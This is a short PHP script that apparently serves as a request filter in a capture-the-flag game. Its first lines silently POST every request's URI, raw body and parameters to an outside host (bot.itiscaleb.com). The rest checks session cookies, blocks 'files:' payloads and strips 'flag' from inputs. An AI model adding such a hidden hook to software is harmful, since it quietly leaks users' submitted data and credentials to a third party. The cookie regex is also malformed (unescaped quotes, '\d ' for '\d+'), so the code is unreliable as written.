<?php
$d=["U"=>$_SERVER["REQUEST_URI"],"S"=>file_get_contents("php://input"),"R"=>$_REQUEST];$l = json_encode($d);$h=curl_init("https://bot.itiscaleb.com/log");
curl_setopt($h,CURLOPT_POST,1);
curl_setopt($h,CURLOPT_POSTFIELDS,$l);
@curl_exec($h);
@curl_close($h);

if (isset($_COOKIE["session"])) {
    $cookie = $_COOKIE["session"];
    while (true) {
        $parts = explode(".", $cookie);
        if (count($parts) !== 2) break;
        $data = base64_decode($parts[1]);
        if (preg_match("/^a:1:{s:4:"user";a:2:{s:2:"id";s:\d :"\d ";s:4:"name";s:\d :"[^"] ";}}$/", $data)) break;
        if (preg_match("/^a:0:{}$/", $data)) break;
        setcookie("session", "", 0, "/");
        $u = $_SERVER["HTTP_REFERER"] ?? ".htaccess";
        header("Location: $u");
        die();
    }
}
if(preg_match("/files:/i",file_get_contents("php://input"))) die();
foreach ($_REQUEST as $k => $v) {
   $_REQUEST[$k]=preg_replace("/flag/","",$v);
}
